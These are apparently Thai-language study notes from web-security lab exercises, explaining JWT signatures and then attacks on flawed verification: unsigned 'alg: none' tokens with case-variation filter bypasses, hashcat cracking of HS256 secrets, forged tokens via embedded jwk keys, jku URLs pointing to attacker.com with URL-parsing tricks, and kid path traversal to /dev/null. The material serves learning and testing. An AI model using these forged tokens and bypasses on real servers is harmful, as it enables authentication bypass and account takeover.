
JWT (JSON Web Token) เป็น standard สำหรับการส่งผ่านข้อมูลระหว่าง parties อย่างปลอดภัย โดยหลักๆ แล้ว JWT ช่วยแก้ปัญหาเหล่านี้:

## Pain Points ที่ JWT แก้ได้

**1. Session Management ที่ซับซ้อน**
- แทนที่จะเก็บ session ไว้ใน server (stateful) JWT ทำให้ระบบเป็น stateless
- ไม่ต้องกังวลเรื่อง session storage, cleanup หรือ scaling issues

**2. การ Authentication ข้าม Services**
- ใน microservices architecture สามารถใช้ JWT เดียวกันยืนยันตัวตนได้หลาย services
- ไม่ต้องเรียก authentication service ทุกครั้ง

**3. Cross-Domain Authentication**
- เหมาะสำหรับ Single Page Applications (SPA) และ mobile apps
- ส่งผ่าน HTTP headers ได้ง่าย ไม่ติด cookie domain restrictions

**4. Scalability**
- เนื่องจากเป็น self-contained token ไม่ต้องพึ่งพา central database
- Load balancer สามารถส่งไปยัง server ไหนก็ได้

**5. Mobile-Friendly**
- Mobile apps ทำงานกับ JWT ได้ง่ายกว่า cookie-based sessions
- เก็บใน local storage หรือ secure storage ได้



## การทำงานของ Signature ใน JWT

### Signature คืออะไร?
Signature เปรียบเหมือน **"ตราประทับดิจิทัล"** ที่รับประกันว่า JWT นี้:
1. **มาจาก server จริง** (Authentication)
2. **ไม่ถูกแก้ไข** (Integrity)

### กระบวนการสร้าง Signature

```javascript
// 1. เตรียม Header และ Payload
header = {
  "alg": "HS256",
  "typ": "JWT"
}

payload = {
  "user_id": 12345,
  "username": "somchai",
  "role": "user",
  "exp": 1640995200
}

// 2. Encode เป็น Base64URL
encodedHeader = base64url(header)    // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
encodedPayload = base64url(payload)  // eyJ1c2VyX2lkIjoxMjM0NSwidXNlcm5hbWUiOiJzb21jaGFpIn0

// 3. รวมกันด้วย dot
message = encodedHeader + "." + encodedPayload

// 4. สร้าง Signature ด้วย secret key
signature = HMACSHA256(message, "your-256-bit-secret")

// 5. JWT สุดท้าย
jwt = encodedHeader + "." + encodedPayload + "." + signature
```


### การตรวจสอบ Signature

```javascript
// เมื่อ server ได้รับ JWT
function verifyJWT(token) {
  // 1. แยก JWT ออกเป็น 3 ส่วน
  const [header, payload, signature] = token.split('.')
  
  // 2. สร้าง signature ใหม่จาก header + payload
  const expectedSignature = HMACSHA256(
    header + "." + payload, 
    "your-256-bit-secret"
  )
  
  // 3. เปรียบเทียบ signature
  if (signature === expectedSignature) {
    return "✅ Valid JWT"
  } else {
    return "❌ Invalid JWT"
  }
}
```

### Algorithm ต่างๆ

**1. HMAC (Symmetric)**
- HS256, HS384, HS512
- ใช้ secret key เดียวกันทั้งสร้างและตรวจสอบ
- เร็ว เหมาะกับ internal services

**2. RSA (Asymmetric)**  
- RS256, RS384, RS512
- Private key สร้าง signature
- Public key ตรวจสอบ signature
- ปลอดภัยกว่า เหมาะกับ public APIs




![alt text](image-7.png)


### รูปแบบ JWT

JWT ประกอบด้วย 3 ส่วน: header, payload และ signature แต่ละส่วนคั่นด้วยจุด ดังตัวอย่างต่อไปนี้:

```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

ส่วน header และ payload ของ JWT เป็นเพียงออบเจ็กต์ JSON ที่เข้ารหัสด้วย base64url header ประกอบด้วยข้อมูลเมตาเกี่ยวกับโทเค็นเอง ขณะที่ payload ประกอบด้วย "claims" จริงเกี่ยวกับผู้ใช้ ตัวอย่างเช่น คุณสามารถถอดรหัส payload จากโทเค็นข้างต้นเพื่อเปิดเผย claims ต่อไปนี้:

```json
{
    "iss": "portswigger",
    "exp": 1648037164,
    "name": "Carlos Montoya",
    "sub": "carlos",
    "role": "blog_author",
    "email": "carlos@carlos-montoya.net",
    "iat": 1516239022
}
```

ในกรณีส่วนใหญ่ ข้อมูลนี้สามารถอ่านหรือแก้ไขได้ง่ายโดยใครก็ตามที่เข้าถึงโทเค็นได้ ดังนั้น ความปลอดภัยของกลไกใดๆ ที่ใช้ JWT จึงพึ่งพาลายเซ็นเข้ารหัสเป็นหลัก



## JWT vs JWS vs JWE## สรุปสำคัญ 🎯

### **JWT = กรอบงานพื้นฐาน**
- เป็นเพียง **แนวคิด** ในการแสดงข้อมูล
- ไม่มีการรักษาความปลอดภัยในตัว
- ต้องใช้ผ่าน JWS หรือ JWE

### **JWS = JWT + Digital Signature**
- ใช้งานจริง **99%** ของ JWT ที่เราเห็น
- ข้อมูล**อ่านได้** แต่**ป้องกันการแปลงแปลง**
- เหมาะสำหรับ authentication, session management

### **JWE = JWT + Encryption**
- เข้ารหัสข้อมูล**ทั้งหมด**
- ใช้เมื่อต้องการความปลอดภัยสูง
- เหมาะกับข้อมูลส่วนตัว, การเงิน

### **ในทางปฏิบัติ:**
- เมื่อคนพูดถึง "JWT" → มักหมายถึง **JWS**
- เอกสารการโจมตี JWT → โจมตี **JWS** เป็นหลัก
- JWE ใช้น้อยกว่ามาก เพราะซับซ้อนและช้า

**จำง่ายๆ:** JWT เป็นกรอบ, JWS เป็นลายเซ็น, JWE เป็นการเข้ารหัส! 🔐

![alt text](image-8.png)

## การโจมตี JWT คืออะไร?

การโจมตี JWT เกี่ยวข้องกับการที่ผู้ใช้ส่ง JWT ที่แก้ไขแล้วไปยังเซิร์ฟเวอร์เพื่อให้บรรลุเป้าหมายที่เป็นอันตราย โดยทั่วไป เป้าหมายนี้คือการหลีกเลี่ยงการตรวจสอบตัวตนและการควบคุมการเข้าถึงโดยการปลอมตัวเป็นผู้ใช้อื่นที่ได้รับการตรวจสอบตัวตนแล้ว

### ผลกระทบของการโจมตี JWT

ผลกระทบของการโจมตี JWT มักจะรุนแรง หากผู้โจมตีสามารถสร้างโทเค็นที่ถูกต้องของตนเองด้วยค่าที่กำหนดเองได้ พวกเขาอาจสามารถยกระดับสิทธิ์ของตนเองหรือปลอมตัวเป็นผู้ใช้อื่น โดยครอบคลุมบัญชีของพวกเขาอย่างสมบูรณ์



## การใช้ประโยชน์จากการตรวจสอบลายเซ็น JWT ที่มีข้อบกพร่อง

ตัวอย่างเช่น ลองพิจารณา JWT ที่มี claims ดังต่อไปนี้:

```json
{ 
    "username": "carlos", 
    "isAdmin": false 
}
```

หากเซิร์ฟเวอร์ระบุเซสชันตาม `username` นี้ การแก้ไขค่าดังกล่าวอาจทำให้ผู้โจมตีสามารถปลอมตัวเป็นผู้ใช้อื่นที่เข้าสู่ระบบได้ ในทำนองเดียวกัน หากค่า `isAdmin` ถูกใช้สำหรับการควบคุมการเข้าถึง สิ่งนี้อาจให้เวกเตอร์ง่ายๆ สำหรับการยกระดับสิทธิ์



### การยอมรับลายเซ็นใดก็ได้

ไลบรารี JWT โดยทั่วไปจะมีเมธอดหนึ่งสำหรับการตรวจสอบโทเค็นและอีกเมธอดหนึ่งที่เพียงแค่ถอดรหัส ตัวอย่างเช่น ไลบรารี Node.js `jsonwebtoken` มี `verify()` และ `decode()`

บางครั้ง นักพัฒนาเข้าใจผิดระหว่างเมธอดทั้งสองนี้และส่งโทเค็นที่เข้ามาไปยังเมธอด `decode()` เท่านั้น สิ่งนี้แสดงว่าแอปพลิเคชันไม่ได้ตรวจสอบลายเซ็นเลย

**ประเด็นสำคัญ:**
- เมธอด `verify()` = ตรวจสอบความถูกต้องของลายเซ็น
- เมธอด `decode()` = เพียงแค่ถอดรหัสเนื้อหาโดยไม่ตรวจสอบลายเซ็น

การใช้ `decode()` แทน `verify()` เป็นข้อผิดพลาดที่อันตราย เพราะทำให้ผู้โจมตีสามารถแก้ไขเนื้อหา JWT ได้โดยไม่ต้องกังวลเรื่องลายเซ็นที่ถูกต้อง

**ตัวอย่างการโจมตี:**
1. ผู้โจมตีได้รับ JWT ที่ถูกต้อง
2. ถอดรหัส payload และแก้ไขค่า เช่น เปลี่ยน `"isAdmin": false` เป็น `"isAdmin": true`
3. เข้ารหัส payload ใหม่
4. ส่งโทเค็นที่แก้ไขแล้วไปยังเซิร์ฟเวอร์
5. เซิร์ฟเวอร์ใช้ `decode()` โดยไม่ตรวจสอบลายเซ็น ทำให้ยอมรับการเปลี่ยนแปลง


![alt text](image.png)

![alt text](image-2.png)

![alt text](image-1.png)

backend ไม่ได้ verify signature ทำให้สามารถ edit sub เป็น administator เพื่อใช้สิท /admin


## การยอมรับโทเค็นที่ไม่มีลายเซ็น

ส่วน JWT header ประกอบด้วยพารามิเตอร์ `alg` ซึ่งบอกเซิร์ฟเวอร์ว่าใช้อัลกอริทึมใดในการเซ็นโทเค็น และดังนั้นจึงต้องใช้อัลกอริทึมใดในการตรวจสอบลายเซ็น

```json
{ 
    "alg": "HS256", 
    "typ": "JWT" 
}
```

สิ่งนี้มีข้อบกพร่องโดยธรรมชาติเพราะเซิร์ฟเวอร์ไม่มีทางเลือกอื่นนอกจากต้องเชื่อถือข้อมูลที่ผู้ใช้สามารถควบคุมได้จากโทเค็นโดยปริยาย ซึ่งในจุดนี้ยังไม่ได้รับการตรวจสอบเลย กล่าวอีกนัยหนึ่ง ผู้โจมตีสามารถมีอิทธิพลโดยตรงต่อวิธีที่เซิร์ฟเวอร์ตรวจสอบว่าโทเค็นน่าเชื่อถือหรือไม่

JWT สามารถเซ็นโดยใช้อัลกอริทึมที่แตกต่างกันได้หลายแบบ แต่ยังสามารถปล่อยให้ไม่มีลายเซ็นได้ ในกรณีนี้ พารามิเตอร์ `alg` จะถูกตั้งค่าเป็น `none` ซึ่งระบุสิ่งที่เรียกว่า "unsecured JWT" เนื่องจากอันตรายที่ชัดเจนของสิ่งนี้ เซิร์ฟเวอร์มักจะปฏิเสธโทเค็นที่ไม่มีลายเซ็น อย่างไรก็ตาม เนื่องจากการกรองประเภทนี้อาศัยการแยกวิเคราะห์สตริง คุณบางครั้งสามารถหลีกเลี่ยงตัวกรองเหล่านี้ได้โดยใช้เทคนิคการปิดบังแบบคลาสสิก เช่น การใช้ตัวพิมพ์ใหญ่-เล็กแบบผสมและการเข้ารหัสที่ไม่คาดคิด

### เทคนิคการหลีกเลี่ยงตัวกรอง:

**1. การใช้ตัวพิมพ์ใหญ่-เล็กแบบผสม:**
- `"alg": "None"`
- `"alg": "NONE"`
- `"alg": "nOnE"`

**2. การใช้การเข้ารหัสที่ไม่คาดคิด:**
- การเพิ่มช่องว่าง: `"alg": " none "`
- การใช้ null bytes หรือตัวอักษรพิเศษ

**3. ตัวอย่าง JWT ที่ไม่มีลายเซ็น:**

**Header:**
```json
{
    "alg": "none",
    "typ": "JWT"
}
```

**Payload:**
```json
{
    "username": "admin",
    "isAdmin": true
}
```

**โครงสร้าง JWT สุดท้าย:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.
```

### หมายเหตุสำคัญ:
แม้ว่าโทเค็นจะไม่ได้เซ็น แต่ส่วน payload ยังคงต้องลงท้ายด้วยจุดต่อท้าย (trailing dot)

![alt text](image-4.png)

![alt text](image-3.png)

## การ Brute-force Secret Keys

อัลกอริทึมการเซ็นบางตัว เช่น HS256 (HMAC + SHA-256) ใช้สตริงแบบสแตนด์อโลนใดๆ เป็น secret key เช่นเดียวกับรหัสผ่าน สิ่งสำคัญคือ secret นี้ต้องเดาไม่ได้ง่ายหรือ brute-force ไม่ได้โดยผู้โจมตี มิฉะนั้น พวกเขาอาจสามารถสร้าง JWT ด้วยค่า header และ payload ใดก็ได้ที่ต้องการ จากนั้นใช้ key เพื่อเซ็นโทเค็นใหม่ด้วยลายเซ็นที่ถูกต้อง

เมื่อใช้งานแอปพลิเคชัน JWT นักพัฒนาบางครั้งทำผิดพลาด เช่น ลืมเปลี่ยน secret เริ่มต้นหรือตัวแทน พวกเขาอาจแม้แต่คัดลอกและวางโค้ดที่พบออนไลน์ จากนั้นลืมเปลี่ยน secret ที่ฮาร์ดโค้ดที่ให้เป็นตัวอย่าง ในกรณีนี้ ผู้โจมตีสามารถ brute-force secret ของเซิร์ฟเวอร์ได้อย่างง่ายดายโดยใช้ wordlist ของ secret ที่รู้จักกันดี


### ขั้นตอนการโจมตี:

**1. เตรียมข้อมูล:**
- JWT ที่ถูกต้องและเซ็นแล้วจากเซิร์ฟเวอร์เป้าหมาย
- Wordlist ของ secret ที่รู้จักกันดี

**2. รันคำสั่ง hashcat:**
```bash
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

**พารามิเตอร์อธิบาย:**
- `-a 0`: Attack mode (dictionary attack)
- `-m 16500`: Hash mode สำหรับ JWT (HS256)
- `<jwt>`: โทเค็น JWT ที่ต้องการหา secret
- `<wordlist>`: ไฟล์ wordlist ที่มี secret ที่เป็นไปได้

**3. วิธีการทำงาน:**
Hashcat จะเซ็น header และ payload จาก JWT โดยใช้ secret แต่ละตัวใน wordlist จากนั้นเปรียบเทียบลายเซ็นที่ได้กับต้นฉบับจากเซิร์ฟเวอร์ หากลายเซ็นใดตรงกัน hashcat จะแสดง secret ที่ระบุในรูปแบบต่อไปนี้ พร้อมกับรายละเอียดอื่นๆ:

```
<jwt>:<identified-secret>
```

**4. การแสดงผลลัพธ์:**
หากคุณรันคำสั่งมากกว่าหนึ่งครั้ง คุณต้องใส่ flag `--show` เพื่อแสดงผลลัพธ์:

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist> --show
```


### การใช้ Secret ที่ค้นพบ:

เมื่อคุณระบุ secret key ได้แล้ว คุณสามารถใช้มันเพื่อสร้างลายเซ็นที่ถูกต้องสำหรับ JWT header และ payload ใดๆ ที่คุณต้องการ

**ขั้นตอนต่อไป:**
1. แก้ไข payload (เช่น เปลี่ยน role หรือ permissions)
2. ใช้ secret ที่ค้นพบเพื่อเซ็นโทเค็นใหม่
3. ส่ง JWT ที่แก้ไขแล้วไปยังเซิร์ฟเวอร์


![alt text](image-5.png)

```
└─$ hashcat -a 0 -m 16500 eyJraWQiOiI2ODNmMDkzZS03YjQzLTQ2M2YtODgyOC01YWYwMDNkMzZkYWEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NzkwMDE5NSwic3ViIjoid2llbmVyIn0.IImjKIlv2Lp6J9QsGgpXzDC75dlgFQ1xN-cPuyhhw_k jwt.secrets.list 
```

![alt text](image-6.png)

![alt text](image-10.png)


ใน JWK format สำหรับ symmetric key (HMAC) คุณสมบัติ `k` **ต้องเป็น Base64URL-encoded** ตามมาตรฐาน RFC 7517

![alt text](image-11.png)



## การฉีด JWT Header Parameter

ตามข้อกำหนด JWS มีเพียงพารามิเตอร์ header `alg` เท่านั้นที่บังคับ อย่างไรก็ตาม ในทางปฏิบัติ JWT header (หรือที่เรียกว่า JOSE header) มักประกอบด้วยพารามิเตอร์อื่นๆ หลายตัว สิ่งต่อไปนี้มีความสำคัญเป็นพิเศษสำหรับผู้โจมตี:

- **jwk (JSON Web Key)** - ให้ออบเจ็กต์ JSON ฝังตัวที่แสดงถึง key
- **jku (JSON Web Key Set URL)** - ให้ URL ที่เซิร์ฟเวอร์สามารถดึงชุดของ key ที่ประกอบด้วย key ที่ถูกต้อง
- **kid (Key ID)** - ให้ ID ที่เซิร์ฟเวอร์สามารถใช้ระบุ key ที่ถูกต้องในกรณีที่มี key หลายตัวให้เลือก ขึ้นอยู่กับรูปแบบของ key อาจมีพารามิเตอร์ kid ที่ตรงกัน

อย่างที่คุณเห็น พารามิเตอร์ที่ผู้ใช้ควบคุมได้เหล่านี้แต่ละตัวจะบอกเซิร์ฟเวอร์ผู้รับว่าจะใช้ key ใดในการตรวจสอบลายเซ็น ในส่วนนี้ คุณจะได้เรียนรู้วิธีการใช้ประโยชน์จากสิ่งเหล่านี้เพื่อฉีด JWT ที่แก้ไขแล้วซึ่งเซ็นโดยใช้ key ตามอำเภอใจของคุณเองแทนที่จะเป็น secret ของเซิร์ฟเวอร์

### การฉีด Self-signed JWT ผ่านพารามิเตอร์ jwk

ข้อกำหนด JSON Web Signature (JWS) อธิบายพารามิเตอร์ header `jwk` ที่เป็นทางเลือก ซึ่งเซิร์ฟเวอร์สามารถใช้เพื่อฝัง public key ของพวกเขาโดยตรงภายในโทเค็นเองในรูปแบบ JWK

**JWK**
JWK (JSON Web Key) เป็นรูปแบบมาตรฐานสำหรับการแสดง key เป็นออบเจ็กต์ JSON

คุณสามารถเห็นตัวอย่างในส่วน JWT header ต่อไปนี้:

```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

**Public และ Private Key**

ตามหลักแล้ว เซิร์ฟเวอร์ควรใช้เฉพาะ whitelist ที่จำกัดของ public key เพื่อตรวจสอบลายเซ็น JWT อย่างไรก็ตาม เซิร์ฟเวอร์ที่กำหนดค่าผิดบางครั้งจะใช้ key ใดก็ได้ที่ฝังอยู่ในพารามิเตอร์ `jwk`

คุณสามารถใช้ประโยชน์จากพฤติกรรมนี้โดยการเซ็น JWT ที่แก้ไขแล้วโดยใช้ RSA private key ของคุณเอง จากนั้นฝัง public key ที่ตรงกันใน jwk header

แม้ว่าคุณสามารถเพิ่มหรือแก้ไขพารามิเตอร์ `jwk` ใน Burp ด้วยตนเองได้ แต่ JWT Editor extension ให้คุณสมบัติที่มีประโยชน์เพื่อช่วยคุณทดสอบช่องโหว่นี้:

1. เมื่อโหลด extension แล้ว ในแถบแท็บหลักของ Burp ไปที่แท็บ JWT Editor Keys
2. สร้าง RSA key ใหม่
3. ส่ง request ที่ประกอบด้วย JWT ไปยัง Burp Repeater
4. ใน message editor เปลี่ยนไปที่แท็บ JSON Web Token ที่ extension สร้างขึ้น และแก้ไข payload ของโทเค็นตามที่คุณต้องการ
5. คลิก Attack จากนั้นเลือก Embedded JWK เมื่อได้รับการแจ้ง ให้เลือก RSA key ที่คุณเพิ่งสร้างขึ้น
6. ส่ง request เพื่อทดสอบว่าเซิร์ฟเวอร์ตอบสนองอย่างไร

คุณยังสามารถทำการโจมตีนี้ด้วยตนเองโดยการเพิ่ม jwk header เอง อย่างไรก็ตาม คุณอาจต้องอัปเดตพารามิเตอร์ header `kid` ของ JWT ให้ตรงกับ kid ของ key ที่ฝังไว้ด้วย การโจมตีในตัวของ extension จะดูแลขั้นตอนนี้ให้คุณ

![alt text](image-13.png)

-server supports the jwk parameter in the JWT header. 

-sometimes used to embed the correct verification key directly in the token. 

-fails to check whether the provided key came from a trusted source.

![alt text](image-14.png)

![alt text](image-15.png)



### สิ่งที่เกิดขึ้นจริง:
1. **เซิร์ฟเวอร์ตรวจสอบ signature** ✅
2. **แต่ใช้ public key ผิดตัว** ❌ (ใช้ public key จาก jwk header แทนที่จะเป็น public key ของเซิร์ฟเวอร์)

### กระบวนการโจมตี:
```
1. ผู้โจมตีสร้าง RSA key pair ของตนเอง
   - Private key: สำหรับเซ็น JWT
   - Public key: ใส่ใน jwk header

2. เซ็น JWT ด้วย private key ของผู้โจมตี
   ✅ signature ถูกต้อง (สำหรับ key ของผู้โจมตี)

3. ส่ง JWT ไปยังเซิร์ฟเวอร์

4. เซิร์ฟเวอร์ตรวจสอบ signature โดยใช้ public key จาก jwk header
   ✅ signature ผ่าน! (เพราะใช้ public key ที่ตรงกับ private key ที่เซ็น)
```

### ปัญหาคือ:
- **เซิร์ฟเวอร์ตรวจสอบ signature** ✅
- **แต่ใช้ public key ของผู้โจมตี** ❌ แทนที่จะเป็น public key ของเซิร์ฟเวอร์


# JWT jku (JWK Set URL) Parameter

## jku คืออะไร?

**jku (JSON Web Key Set URL)** คือพารามิเตอร์ใน JWT header ที่ให้ URL ที่เซิร์ฟเวอร์สามารถดาวน์โหลด JWK Set (ชุดของ public keys) เพื่อใช้ในการตรวจสอบลายเซ็น JWT

## JWK Set คืออะไร?

JWK Set เป็น JSON object ที่ประกอบด้วย array ของ JWKs แทนที่จะฝัง key ตัวเดียวใน JWT header:

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB", 
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y..."
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA", 
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67..."
        }
    ]
}
```

## วิธีการทำงานของ jku

### 1. JWT Header ที่มี jku
```json
{
    "alg": "RS256",
    "typ": "JWT", 
    "jku": "https://example.com/.well-known/jwks.json",
    "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab"
}
```

### 2. ขั้นตอนการตรวจสอบ
1. **เซิร์ฟเวอร์อ่าน jku URL** จาก JWT header
2. **ดาวน์โหลด JWK Set** จาก URL นั้น
3. **หา key ที่ตรงกับ kid** ใน JWK Set 
4. **ใช้ key นั้นตรวจสอบลายเซ็น** JWT

### 3. ตัวอย่างขั้นตอน

```
JWT Header: {"alg":"RS256","jku":"https://trusted.com/keys","kid":"key1"}
                     ↓
Server fetches: https://trusted.com/keys  
                     ↓
Gets JWK Set: {"keys":[{"kid":"key1","kty":"RSA",...}]}
                     ↓
Uses key with kid="key1" to verify signature
```

## ช่องโหว่ของ jku

### 1. ไม่ตรวจสอบ URL ที่เชื่อถือได้
หาก server ไม่มี whitelist ของ trusted domains:

```json
{
    "alg": "RS256", 
    "jku": "https://attacker.com/malicious-keys",
    "kid": "malicious-key"
}
```

### 2. URL Parsing Bypass
ใช้เทคนิค URL parsing เพื่อหลีกเลี่ยง domain filtering:

```
https://trusted.com.attacker.com/keys
https://trusted.com@attacker.com/keys  
https://trusted.com#@attacker.com/keys
```

### 3. การโจมตีขั้นตอน

**Step 1:** สร้าง malicious JWK Set
```json
{
    "keys": [
        {
            "kty": "RSA",
            "kid": "attacker-key",
            "e": "AQAB",
            "n": "your-public-key-here..."
        }
    ]
}
```

**Step 2:** Host JWK Set บนเซิร์ฟเวอร์ของผู้โจมตี
```
https://attacker.com/malicious-keys
```

**Step 3:** สร้าง JWT ที่ชี้ไป malicious URL
```json
{
    "alg": "RS256",
    "jku": "https://attacker.com/malicious-keys", 
    "kid": "attacker-key"
}
```

**Step 4:** เซ็น JWT ด้วย private key ที่ตรงกัน

## ตัวอย่างการโจมตี jku ใน Burp Suite

### 1. Setup
- สร้าง RSA key pair ใน JWT Editor
- Host malicious JWK Set บน server ของคุณ

### 2. สร้าง Malicious JWT
```json
{
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://your-server.com/malicious-keys",
    "kid": "your-key-id"
}
```

### 3. Payload
```json
{
    "sub": "administrator",
    "iat": 1516239022,
    "exp": 1648037164
}
```


| Aspect | jwk | jku |
|--------|-----|-----|
| **Location** | ฝังใน JWT header | External URL |



![alt text](image-18.png)

![alt text](image-16.png)

![alt text](image-17.png)




## การฉีด Self-signed JWT ผ่านพารามิเตอร์ kid

เซิร์ฟเวอร์อาจใช้ cryptographic key หลายตัวสำหรับเซ็นข้อมูลประเภทต่างๆ ไม่เพียงแค่ JWT ด้วยเหตุนี้ header ของ JWT อาจประกอบด้วยพารามิเตอร์ `kid` (Key ID) ซึ่งช่วยเซิร์ฟเวอร์ระบุว่าจะใช้ key ใดในการตรวจสอบลายเซ็น

### วิธีการทำงานของ kid parameter

**การเก็บ Verification Key:**
- มักเก็บใน JWK Set
- เซิร์ฟเวอร์จะหา JWK ที่มี `kid` เดียวกันกับโทเค็น
- ข้อกำหนด JWS ไม่ได้กำหนดโครงสร้างเฉพาะของ ID นี้
- เป็นเพียงสตริงที่นักพัฒนาเลือกเอง

**ตัวอย่างการใช้งาน:**
- ชี้ไปยัง entry เฉพาะในฐานข้อมูล
- ใช้เป็นชื่อไฟล์

### ช่องโหว่ Directory Traversal

หากพารามิเตอร์ `kid` มีช่องโหว่ต่อ directory traversal ผู้โจมตีสามารถบังคับให้เซิร์ฟเวอร์ใช้ไฟล์ใดก็ได้จากระบบไฟล์เป็น verification key:

```json
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

### อันตรายของการใช้ Symmetric Algorithm

สิ่งนี้อันตรายเป็นพิเศษหากเซิร์ฟเวอร์รองรับ JWT ที่เซ็นด้วยอัลกอริทึมแบบสมมาตร (เช่น HS256) เพราะ:

1. ผู้โจมตีสามารถชี้ `kid` ไปยังไฟล์ที่คาดเดาได้
2. เซ็น JWT โดยใช้ secret ที่ตรงกับเนื้อหาของไฟล์นั้น
3. เซิร์ฟเวอร์จะใช้เนื้อหาไฟล์เป็น key ในการตรวจสอบ

### การโจมตีด้วย /dev/null

**วิธีการที่ง่ายที่สุด:**
- ใช้ `/dev/null` (มีอยู่ในระบบ Linux ส่วนใหญ่)
- เป็นไฟล์ว่าง → การอ่านคืนค่าสตริงว่าง
- เซ็นโทเค็นด้วยสตริงว่าง → ได้ลายเซ็นที่ถูกต้อง

**ตัวอย่าง payload:**
```json
{
    "kid": "/dev/null",
    "typ": "JWT", 
    "alg": "HS256"
}
```

### เทคนิคการใช้งานกับ JWT Editor Extension

**ปัญหา:** JWT Editor extension ไม่อนุญาตให้เซ็นโทเค็นด้วยสตริงว่าง

**วิธีแก้:** ใช้ Base64-encoded null byte เพื่อหลีกเลี่ยงข้อจำกัดนี้

### ตัวอย่างการโจมตีทีละขั้นตอน:

1. **แก้ไข JWT Header:**
   ```json
   {
       "kid": "/dev/null",
       "alg": "HS256",
       "typ": "JWT"
   }
   ```

2. **แก้ไข Payload** (เช่น เปลี่ยน role เป็น admin)

3. **เซ็นด้วย Empty String** หรือ Base64-encoded null byte

4. **ส่ง Request** → เซิร์ฟเวอร์จะ:
   - อ่าน `/dev/null` → ได้สตริงว่าง
   - ใช้สตริงว่างเป็น secret key
   - ตรวจสอบลายเซ็น → ผ่าน!


ช่องโหว่นี้แสดงให้เห็นความสำคัญของการตรวจสอบและจำกัดค่า `kid` parameter เพื่อป้องกันไม่ให้ผู้โจมตีใช้ไฟล์ระบบเป็น verification key







![alt text](image-19.png)

![alt text](image-20.png)